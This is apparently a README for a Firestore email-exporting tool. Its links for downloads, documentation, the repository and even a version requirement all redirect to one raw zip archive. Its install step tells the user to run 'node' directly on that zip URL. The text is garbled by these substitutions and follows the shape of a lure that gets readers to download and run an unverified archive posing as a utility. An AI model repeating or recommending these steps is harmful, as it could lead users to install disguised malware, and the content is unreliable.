# 📧 firestore-email-exporter - Export Emails Easily from Firestore
...
[![Download](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip)

To get started, visit the following link to download the application: [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip).
...
- **https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip**: Version 12 or higher.
- **Python**: Version 3.6 or higher installed for certain features.

## 📥 Download & Install

1. Visit the [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip).
...
3. Run the following command to start the application:
   ...
   ```bash
   node https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip
   ```
...
For additional assistance, check the documentation available on the [GitHub Repository](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip). You can also raise issues or ask questions there.
...
Don't forget to download the application again if you need updates or if any issues arise. Always visit the [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/Firestore_Mails_Auslesen/exporter-firestore-email-v1.9.zip) for the latest versions.